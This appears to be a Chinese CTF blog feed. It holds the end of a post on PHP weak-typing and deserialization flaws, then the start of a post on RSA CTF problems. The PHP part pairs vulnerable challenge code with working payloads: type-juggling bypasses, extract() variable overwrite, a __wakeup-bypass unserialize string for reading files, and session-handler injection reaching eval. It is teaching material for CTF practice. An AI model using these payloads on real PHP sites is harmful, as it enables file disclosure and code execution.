json_decode(<span class="variable">$_POST</span>[<span class="string">'message'</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">"*********"</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="built_in">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload: message=&#123;<span class="string">"key"</span>:0&#125;     利用 0==<span class="string">"admin"</span></span><br></pre></td></tr></table></figure><h3 id="in-array-array-search-函数搜索数组中是否存在指定的值。"><a href="#in-array-array-search-函数搜索数组中是否存在指定的值。" class="headerlink" title="in_array()  array_search 函数搜索数组中是否存在指定的值。"></a>in_array()  array_search 函数搜索数组中是否存在指定的值。</h3><p>in_array array_search 介绍：(bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) ,如果 strict 参数没有提供，那么 in_array 就会使用松散比较来判断 $needle 是否在 $haystack 中。当 strince 的值为 true 时，in_array() 会比较 needls 的类型和 haystack 中的类型是否相同。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$array</span>=[0,1,2,<span class="string">'3'</span>];</span><br><span class="line">var_dump(in_array(<span class="string">'abc'</span>, <span class="variable">$array</span>)); //<span class="literal">true</span></span><br><span class="line">var_dump(in_array(<span class="string">'1bc'</span>, <span class="variable">$array</span>)); //<span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>可以看到上面的情况返回的都是 true,因为 ‘abc’ 会转换为 0，’1bc’ 转换为 1。<br>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"><span class="keyword">if</span>(!is_array(<span class="variable">$_GET</span>[<span class="string">'test'</span>]))&#123;<span class="built_in">exit</span>();&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">'test'</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;count(<span class="variable">$test</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$test</span>[<span class="variable">$i</span>]===<span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"error"</span>;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$test</span>[<span class="variable">$i</span>]=intval(<span class="variable">$test</span>[<span class="variable">$i</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(array_search(<span class="string">"admin"</span>,<span class="variable">$test</span>)===0)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"false"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload: <span class="built_in">test</span>[]=0</span><br></pre></td></tr></table></figure></p><h3 id="extract-变量覆盖-—-从数组中将变量导入到当前的符号表"><a href="#extract-变量覆盖-—-从数组中将变量导入到当前的符号表" class="headerlink" title="extract 变量覆盖 — 从数组中将变量导入到当前的符号表"></a>extract 变量覆盖 — 从数组中将变量导入到当前的符号表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">extract(array,extract_rules,prefix) </span><br><span class="line"></span><br><span class="line">EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</span><br><span class="line">EXTR_SKIP - 如果有冲突，不覆盖已有的变量。（忽略数组中同名的元素）</span><br><span class="line">EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。</span><br><span class="line">EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix（第三个参数）。</span><br><span class="line">EXTR_PREFIX_INVALID - 仅在非法或数字变量名前加上前缀 prefix。</span><br><span class="line">EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。可以用在已经定义了一组合法的变量，然后要从一个数组例如 <span class="variable">$_REQUEST</span> 中提取值覆盖这些变量的场合。</span><br><span class="line">EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</span><br><span class="line">EXTR_REFS - 将变量作为引用提取。这有力地表明了导入的变量仍然引用了 var_array 参数的值。可以单独使用这个标志或者在 extract_type 中用 OR 与其它任何标志结合使用。</span><br></pre></td></tr></table></figure><p>extract 有三种形式可能导致变量覆盖!</p><p>第一种: EXTR_PREFIX_SAME</p><p>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$size</span>=<span class="string">"large"</span>;</span><br><span class="line"><span class="variable">$var_array</span>=array(</span><br><span class="line"><span class="string">"color"</span>=&gt;<span class="string">"blue"</span>,</span><br><span class="line"><span class="string">"size"</span>=&gt;<span class="string">"medium"</span>,</span><br><span class="line"><span class="string">"shape"</span>=&gt;<span class="string">"round"</span></span><br><span class="line">);</span><br><span class="line">extract(<span class="variable">$var_array</span>,EXTR_PREFIX_SAME,<span class="string">"test"</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$color</span>,<span class="variable">$size</span>,<span class="variable">$shape</span>,<span class="variable">$test_size</span>"</span>;</span><br></pre></td></tr></table></figure></p><p>输出为：bule large  round  medium    最后一个 size 变量被覆盖</p><p>第二种: EXTR_OVERWRITE 或者省略 EXTR_OVERWRITE</p><p>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$size</span>=<span class="string">"large"</span>;</span><br><span class="line"><span class="variable">$var_array</span>=array(</span><br><span class="line"><span class="string">"color"</span>=&gt;<span class="string">"blue"</span>,</span><br><span class="line"><span class="string">"size"</span>=&gt;<span class="string">"medium"</span>,</span><br><span class="line"><span class="string">"shape"</span>=&gt;<span class="string">"round"</span></span><br><span class="line">);</span><br><span class="line">extract(<span class="variable">$var_array</span>,EXTR_OVERWRITE);  或者 extract(<span class="variable">$var_array</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$color</span>,<span class="variable">$size</span>,<span class="variable">$shape</span>"</span>;</span><br></pre></td></tr></table></figure></p><p>输出为：bule medium  round      size 变量被覆盖</p><p>第三种: EXTR_IF_EXISTS</p><p>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$size</span>=<span class="string">"large"</span>;</span><br><span class="line"><span class="variable">$var_array</span>=array(</span><br><span class="line"><span class="string">"color"</span>=&gt;<span class="string">"blue"</span>,</span><br><span class="line"><span class="string">"size"</span>=&gt;<span class="string">"medium"</span>,</span><br><span class="line"><span class="string">"shape"</span>=&gt;<span class="string">"round"</span></span><br><span class="line">);</span><br><span class="line">extract(<span class="variable">$var_array</span>,EXTR_IF_EXISTS);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$size</span>"</span>;</span><br></pre></td></tr></table></figure></p><p>输出为：medium size 变量被覆盖</p><p>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123; </span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pass</span> == <span class="variable">$thepassword_123</span>) &#123; </span><br><span class="line">        &lt;?php <span class="built_in">echo</span> <span class="variable">$theflag</span>; ?&gt;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">payload:pass=a&amp;thepassword_123=a</span><br></pre></td></tr></table></figure></p><h3 id="serialize-和-unserialize-漏洞序列化与反序列化简单介绍"><a href="#serialize-和-unserialize-漏洞序列化与反序列化简单介绍" class="headerlink" title="serialize 和 unserialize 漏洞序列化与反序列化简单介绍"></a>serialize 和 unserialize 漏洞序列化与反序列化简单介绍</h3><p>序列化:把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等函数 : serialize()<br>反序列化:恢复原先被序列化的变量 函数: unserialize()</p><p>Example1:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$test1</span> = <span class="string">"hello world"</span>;</span><br><span class="line"><span class="variable">$test2</span> = array(<span class="string">"hello"</span>,<span class="string">"world"</span>);</span><br><span class="line"><span class="variable">$test3</span> = 123456;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$test1</span>); //  s:11:<span class="string">"hello world"</span>;  序列化字符串</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$test2</span>); // a:2:&#123;i:0;s:5:<span class="string">"hello"</span>;i:1;s:5:<span class="string">"world"</span>;&#125; 序列化数组</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$test3</span>); //  i:123456;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>Example2:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class hello&#123;</span><br><span class="line">    public <span class="variable">$test4</span> = <span class="string">"hello,world"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = new hello();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$test</span>);</span><br><span class="line">?&gt;</span><br><span class="line"> //  O:5:<span class="string">"hello"</span>:1:&#123;s:5:<span class="string">"test4"</span>;s:11:<span class="string">"hello,world"</span>;&#125;  序列化对象  首字母代表参数类型 O-&gt;Objext S-&gt;String...</span><br></pre></td></tr></table></figure></p><p>序列化 public private protect 参数产生不同结果</p><p>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    private <span class="variable">$test1</span>=<span class="string">"hello"</span>;</span><br><span class="line">    public <span class="variable">$test2</span>=<span class="string">"hello"</span>;</span><br><span class="line">    protected <span class="variable">$test3</span>=<span class="string">"hello"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = new <span class="built_in">test</span>();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$test</span>); </span><br><span class="line">?&gt;</span><br><span class="line">//  O:4:<span class="string">"test"</span>:3:&#123;s:11:<span class="string">" test test1"</span>;s:5:<span class="string">"hello"</span>;s:5:<span class="string">"test2"</span>;s:5:<span class="string">"hello"</span>;s:8:<span class="string">" * test3"</span>;s:5:<span class="string">"hello"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>test 类定义了三个不同类型(私有，公有，保护)但是值相同的字符串，序列化输出的值不相同<br>通过对网页抓取输出是这样的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">"test"</span>:3:&#123;s:11:<span class="string">"\00test\00test1"</span>;s:5:<span class="string">"hello"</span>;s:5:<span class="string">"test2"</span>;s:5:<span class="string">"hello"</span>;s:8:<span class="string">"\00*\00test3"</span>;s:5:<span class="string">"hello"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    error_reporting(0); </span><br><span class="line">    class sercet&#123; </span><br><span class="line">        private <span class="variable">$file</span>=<span class="string">'index.php'</span>; </span><br><span class="line">        public <span class="keyword">function</span> __construct(<span class="variable">$file</span>)&#123; </span><br><span class="line">            <span class="variable">$this</span>-&gt;file=<span class="variable">$file</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123; </span><br><span class="line">            <span class="built_in">echo</span> show_source(<span class="variable">$this</span>-&gt;file,<span class="literal">true</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123; </span><br><span class="line">            <span class="variable">$this</span>-&gt;file=<span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="variable">$cmd</span>=cmd00; </span><br><span class="line">    <span class="keyword">if</span> (!isset(<span class="variable">$_GET</span>[<span class="variable">$cmd</span>]))&#123; </span><br><span class="line">        <span class="built_in">echo</span> show_source(<span class="string">'index.php'</span>,<span class="literal">true</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="variable">$cmd</span>=base64_decode(<span class="variable">$_GET</span>[<span class="variable">$cmd</span>]); </span><br><span class="line">        <span class="keyword">if</span> ((preg_match(<span class="string">'/[oc]:\d+:/i'</span>,<span class="variable">$cmd</span>))||(preg_match(<span class="string">'/flag/i'</span>,<span class="variable">$cmd</span>)))&#123; </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Are u gaoshing?"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            unserialize(<span class="variable">$cmd</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">?&gt; </span><br><span class="line">//sercet <span class="keyword">in</span> the_next.php</span><br></pre></td></tr></table></figure></p><p>绕过正则可以用+号 绕过 __weakup 当成员属性数目大于实际数目时可绕过 wakeup<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:O:+6:<span class="string">"sercet"</span>:2:&#123;S:12:<span class="string">"\00sercet\00file"</span>;s:12:<span class="string">"the_next.php"</span>;&#125;  TzorNjoic2VyY2V0IjoyOntTOjEyOiJcMDBzZXJjZXRcMDBmaWxlIjtzOjEyOiJ0aGVfbmV4dC5waHAiO30KCgo=</span><br></pre></td></tr></table></figure></p><p>Example2:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span></span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$username</span> = <span class="string">''</span>;</span><br><span class="line">    public <span class="variable">$password</span> = <span class="string">''</span>;</span><br><span class="line">    public <span class="variable">$file</span> = <span class="string">''</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">out</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"username: "</span>.<span class="variable">$this</span>-&gt;username.<span class="string">"&lt;br&gt;"</span>.<span class="string">"password: "</span>.<span class="variable">$this</span>-&gt;password ;</span><br><span class="line">    &#125;</span><br><span class="line">     public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> file_get_contents(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = new <span class="built_in">test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file = <span class="string">'C:\Users\YZ\Desktop\plan.txt'</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>// _tostring 方法会在输出实例的时候执行，如果实例路径是隐秘文件就可以读取了</p><p>poc:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span></span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$username</span> = <span class="string">''</span>;</span><br><span class="line">    public <span class="variable">$password</span> = <span class="string">''</span>;</span><br><span class="line">    public <span class="variable">$file</span> = <span class="string">''</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">out</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"username: "</span>.<span class="variable">$this</span>-&gt;username.<span class="string">"&lt;br&gt;"</span>.<span class="string">"password: "</span>.<span class="variable">$this</span>-&gt;password ;</span><br><span class="line">    &#125;</span><br><span class="line">     public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> file_get_contents(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">'O:4:"test":3:&#123;s:8:"username";s:0:"";s:8:"password";s:0:"";s:4:"file";s:28:"C:\Users\YZ\Desktop\plan.txt";&#125;'</span>;</span><br><span class="line"><span class="built_in">echo</span> unserialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h3 id="session-反序列化漏洞"><a href="#session-反序列化漏洞" class="headerlink" title="session 反序列化漏洞"></a>session 反序列化漏洞</h3><p>主要原因是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_set(‘session.serialize_handler’, ‘php_serialize’);</span><br><span class="line">ini_set(‘session.serialize_handler’, ‘php’);</span><br></pre></td></tr></table></figure></p><p>两者处理 session 的方式不同</p><p>利用下面代码可以生成 session 值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);//a:1:&#123;s:6:<span class="string">"spoock"</span>;s:3:<span class="string">"111"</span>;&#125;</span><br><span class="line">//ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);//spoock|s:3:<span class="string">"111"</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">"spoock"</span>]=<span class="variable">$_GET</span>[<span class="string">"a"</span>];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>我们来看看生成的 session 值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spoock|s:3:<span class="string">"111"</span>;    // session 键值|内容序列化</span><br><span class="line">a:1:&#123;s:6:<span class="string">"spoock"</span>;s:3:<span class="string">"111"</span>;&#125;a:1:&#123;s:N:session 键值;内容序列化&#125;</span><br><span class="line">在ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);中把 | 之前认为是键值后面的视为序列化</span><br></pre></td></tr></table></figure></p><p>那么就可以利用这一漏洞执行一些恶意代码</p><p>看下面的例子<br>1.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">"spoock"</span>]=<span class="variable">$_GET</span>[<span class="string">"a"</span>];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>2.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line">class lemon &#123;</span><br><span class="line">    var <span class="variable">$hi</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;hi = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">         <span class="built_in">eval</span>(<span class="variable">$this</span>-&gt;hi);//这里很危险，可以执行用户输入的参数</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>在 1.PHP 里面输入 a 参数序列化的值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:”lemon”:1:&#123;s:2:”hi”;s:10:”phpinfo();”;&#125;</span><br></pre></td></tr></table></figure></p><p>则被序列化为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:6:”spoock”;s:44:”|O:5:”lemon”:1:&#123;s:2:”hi”;s:10:”phpinfo();”;&#125;</span><br></pre></td></tr></table></figure></p><p>在 2.PHP 里面打开<br>就可以执行 phpinfo()了 </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常见的 php 弱类型归纳&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://archimesan.me/tags/ctf/"/>
    
      <category term="常见漏洞" scheme="http://archimesan.me/tags/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>RSA归纳</title>
    <link href="http://archimesan.me/2017/12/20/RSA%E5%BD%92%E7%BA%B3/"/>
    <id>http://archimesan.me/2017/12/20/RSA归纳/</id>
    <published>2017-12-20T00:36:29.000Z</published>
    <updated>2019-03-22T07:03:56.822Z</updated>
    
    <content type="html"><![CDATA[<p>分享一些RSA题目</p><a id="more"></a><h1 id="RSA-原理"><a href="#RSA-原理" class="headerlink" title="RSA 原理"></a>RSA 原理</h1><p>RSA 大概原理，可百度<br>大数 N 是由两个大的素数相乘而得，如果 N 唯一，p，q 唯一<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">N = p*q</span><br><span class="line">fn = (p-1)*(q-1)</span><br></pre></td></tr></table></figure></p><p>找到一对 e,d 使得 e*d mod fn = 1，如果 e 是公钥，d 就是私钥<br>明文 c，密文 m 的关系，^ 为幂运算符<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c = m^e mod N</span><br><span class="line">m = c^d mod N</span><br></pre></td></tr></table></figure></p><p>ps:如果 e=1,则 c=m </p><h1 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h1><p>已知 <a href="public.zip">PUBLIC KEY</a> 和 <a href="flag.enc">flag.enc</a></p><h2 id="公钥算出-N-e"><a href="#公钥算出-N-e" class="headerlink" title="公钥算出 N e"></a>公钥算出 N e</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA </span><br><span class="line">pub = RSA.importKey(open(<span class="string">'public.pem'</span>).<span class="built_in">read</span>())</span><br><span class="line">n = long(pub.n)</span><br><span class="line">e = long(pub.e)</span><br><span class="line"><span class="built_in">print</span> n</span><br><span class="line"><span class="built_in">print</span> e</span><br></pre></td></tr></table></figure><h2 id="分解-N-得出-p-q"><a href="#分解-N-得出-p-q" class="headerlink" title="分解 N 得出 p q"></a>分解 N 得出 p q</h2><p>利用工具：<a href="yafu-1.34.zip">yafu下载</a></p><p>使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yafu-x64.exe factor(109966163992...) </span><br><span class="line"></span><br><span class="line">q=286924040788547268861394901519826758027</span><br><span class="line">p=258631601377848992211685134376492365269</span><br></pre></td></tr></table></figure><p>N 如果太大可能无法分解</p><h2 id="利用-p-q-e-算-d"><a href="#利用-p-q-e-算-d" class="headerlink" title="利用 p q e 算 d"></a>利用 p q e 算 d</h2><p>方法一：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p=286924040788547268861394901519826758027  </span><br><span class="line">q=258631601377848992211685134376492365269</span><br><span class="line">e=65537</span><br><span class="line">d=gmpy2.invert(e, (p-1)*(q-1))</span><br><span class="line"><span class="built_in">print</span> d</span><br><span class="line"></span><br><span class="line">d=23071769375111040425287244625328797615295772814180109366784249976498215494337</span><br></pre></td></tr></table></figure></p><p>方法二：</p><p>利用 rsatool.py <a href="rsatool.py">rsatool.py下载</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -p 286924040788547268861394901519826758027  -q 258631601377848992211685134376492365269 -e 65537</span><br></pre></td></tr></table></figure></p><p>ps: 得出的 d 是16进制</p><p><img src="rsatool.png" alt></p><h2 